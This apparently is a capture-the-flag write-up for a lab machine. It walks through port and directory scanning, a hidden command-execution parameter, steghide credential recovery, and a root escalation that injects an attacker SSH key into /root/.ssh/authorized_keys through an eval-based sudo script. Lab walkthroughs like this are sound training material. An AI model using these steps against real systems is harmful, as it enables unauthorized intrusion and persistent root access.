{% from "macros.html" import console, image, text, code, list, link, header, script, imageModal %}

{{imageModal()}}

{{header("Enumeration", "enumeration")}}

{{text("We start by scanning the target for open ports.")}}

{{console("nmap -T5 -p- -sV -sC 10.10.123.111", "Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-19 12:47 CET
Warning: 10.10.123.111 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.123.111
Host is up (0.15s latency).
Not shown: 88 closed tcp ports (conn-refused)
PORT   STATE    SERVICE     VERSION
22/tcp open     ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 58:2f:ec:23:ba:a9:fe:81:8a:8e:2d:d8:91:21:d2:76 (RSA)
|   256 9d:f2:63:fd:7c:f3:24:62:47:8a:fb:08:b2:29:e2:b4 (ECDSA)
|_  256 62:d8:f8:c9:60:0f:70:1f:6e:11:ab:a0:33:79:b5:5d (ED25519)
80/tcp open     http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: U.A. High School
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel")}}

{{text("The scan reveals two open ports: ")}}

{{list(['22 (SSH)', '80 (HTTP)'])}}

{{header("Shell as www-data", "shell-as-www-data")}}

{{text("Next, we proceed to examine the website hosted on port 80.")}}

{{image("../../static/writeups/uahighschool/images/000001.jpg")}}

{{text("Inspecting the source code reveals a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/assets</code> directory.")}}

{{image("../../static/writeups/uahighschool/images/000002.jpg")}}

{{text("Navigating to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/assets</code> displays a blank page, which seems unusual.")}}

{{text("Access to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/assets/writeups</code> is forbidden.")}}

{{text("I used a directory-scanning tool to uncover any hidden directories.")}}

{{console("gobuster dir -u http://10.10.123.111/assets/ -w /usr/share/wordlists/dirb/common.txt", "===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.123.111/assets/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/images               (Status: 301) [Size: 322] [--> http://10.10.123.111/assets/images/]
/index.php            (Status: 200) [Size: 0]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================")}}

{{text("This reveals an <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/index.php</code> file.")}}

{{text("Although the file is empty, trying out different parameters in the URL eventually yields a result.")}}

{{image("../../static/writeups/uahighschool/images/000003.jpg")}}

{{text("It appears that the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>cmd</code> parameter can accept arguments, returning base64-encoded output.")}}

{{text("Let's try and attempt to get a reverse shell.")}}

{{text("I use the following command from <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>revshells.com</code>. Remember to URL encode your payload.")}}

{{image("../../static/writeups/uahighschool/images/000004.jpg")}}

{{text("Passing the encoded payload as a parameter provides us with a reverse shell.")}}

{{image("../../static/writeups/uahighschool/images/000005.jpg")}}

{{header("Shell as deku", "shell-as-deku")}}

{{text("There was a file containing a password in <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/var/www/Hidden_Content</code> directory, but its we don't know what is it for.")}}

{{console("cat passphrase.txt | base64 -d", "AllmightForEver!!!")}}

{{text("Further exploration leads to an unused image file in the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/var/www/html/assets/writeups</code> directory.")}}

{{text("I suspected the password might be for extracting hidden content using <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>steghide</code>.")}}

{{text("I Downloaded the image using <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>wget 10.10.123.111/assets/writeups/oneforall.jpg</code>.")}}

{{text("Then, I attempted to extract hidden content with the password.")}}

{{console("steghide extract -sf oneforall.jpg", "Enter passphrase: 
steghide: the file format of the file 'oneforall.jpg' is not supported.")}}

{{text("The extraction failed because the file is of a wrong format.")}}

{{text("Viewing the file's hex dump reveals its <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>PNG</code> signature.")}}

{{console("xxd oneforall.jpg | head", "00000000: 8950 4e47 0d0a 1a0a 0000 0001 0100 0001  .PNG............
00000010: 0001 0000 ffdb 0043 0006 0405 0605 0406  .......C........
00000020: 0605 0607 0706 080a 100a 0a09 090a 140e  ................
00000030: 0f0c 1017 1418 1817 1416 161a 1d25 1f1a  .............%..
00000040: 1b23 1c16 1620 2c20 2326 2729 2a29 191f  .#... , #&')*)..
00000050: 2d30 2d28 3025 2829 28ff db00 4301 0707  -0-(0%()(...C...
00000060: 070a 080a 130a 0a13 281a 161a 2828 2828  ........(...((((
00000070: 2828 2828 2828 2828 2828 2828 2828 2828  (((((((((((((((( 
00000080: 2828 2828 2828 2828 2828 2828 2828 2828  (((((((((((((((( 
00000090: 2828 2828 2828 2828 2828 2828 2828 ffc0  ((((((((((((((..")}}

{{text("Changing the file signature to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>JPG</code> allows <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>steghide</code> to extract the hidden content.")}}

{{image("../../static/writeups/uahighschool/images/000006.jpg")}}

{{text("This reveals credentials to log in via <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>SSH</code>.")}}

{{header("Shell as root", "shell-as-root")}}

{{text("I checked <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>sudo</code> permissions for the user.")}}

{{console("sudo -l", "[sudo] password for deku: 
Matching Defaults entries for deku on myheroacademia:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh")}}

{{text("We are able to run <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>feedback.sh</code> as any user.")}}

{{text("Let's read this file.")}}

{{console("cat feedback.sh", "#!/bin/bash

echo 'Hello, Welcome to the Report Form       '
echo 'This is a way to report various problems'
echo '    Developed by                        '
echo '        The Technical Department of U.A.'

echo 'Enter your feedback:'
read feedback

if [[ '$feedback' != *'\'* && '$feedback' != *')'* && '$feedback' != *'$('* && '$feedback' != *'|'* && '$feedback' != *'&'* && '$feedback' != *';'* && '$feedback' != *'?'* && '$feedback' != *'!'* && '$feedback' != *'\\'* ]]; then
    echo 'It is This:'
    eval 'echo $feedback'

    echo '$feedback' >> /var/log/feedback.txt
    echo 'Feedback successfully saved.'
else
    echo 'Invalid input. Please provide a valid input.' 
fi
")}}

{{text("It echoes any input we provide, if it doesn't contain any of the blacklisted symbols. We can notice that the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>></code> symbol is permitted, meaning we can use it to write to files.")}}

{{text("We generate a public key using <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>ssh-keygen</code>, copy the public key and save it in <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/root/.ssh/authorized_keys</code>")}}

{{console("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILO60uNhTUNMEDTfn5f+qZZDXWg1JcMGtypKRMyIxnn6 kali@kali >> /root/.ssh/authorized_keys")}}

{{image("../../static/writeups/uahighschool/images/000007.jpg")}}

{{text("We now can log in as root by providing our <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>id_rsa</code> key.")}}

{{console("ssh root@10.10.123.111 -i id_rsa")}}

{{text("We are able to find the flag in <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/root</code>.")}}

{{image("../../static/writeups/uahighschool/images/000008.jpg")}}

{{script()}}